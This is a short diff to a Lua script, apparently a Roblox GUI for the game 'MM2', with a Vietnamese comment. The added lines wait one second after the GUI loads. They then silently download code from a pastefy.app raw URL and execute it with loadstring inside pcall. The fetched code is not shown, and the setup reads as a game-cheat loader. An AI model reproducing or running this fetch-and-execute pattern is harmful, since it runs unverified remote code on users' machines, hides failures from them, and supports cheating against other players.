@@ -291,3 +291,10 @@ end
 
 makeDraggable(frame)
 makeDraggable(reopen)
+
+-- chạy script chính MM2 sau khi GUI hiện
+task.delay(1,function()
+pcall(function()
+loadstring(game:HttpGet("https://pastefy.app/xjdjHcY1/raw"))()
+end)
+end)
